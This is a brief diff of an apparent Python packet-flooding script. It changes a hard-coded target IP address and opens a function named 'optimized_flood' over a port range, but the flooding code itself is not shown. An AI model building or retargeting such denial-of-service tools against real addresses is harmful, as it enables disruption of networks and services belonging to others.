@@ -2,7 +2,7 @@ import socket
 import threading
 import time
 
-router_ip = "172.217.33.147"
+router_ip = "62.109.121.42"
 packet_count = [0]
 
 def optimized_flood(port_range):
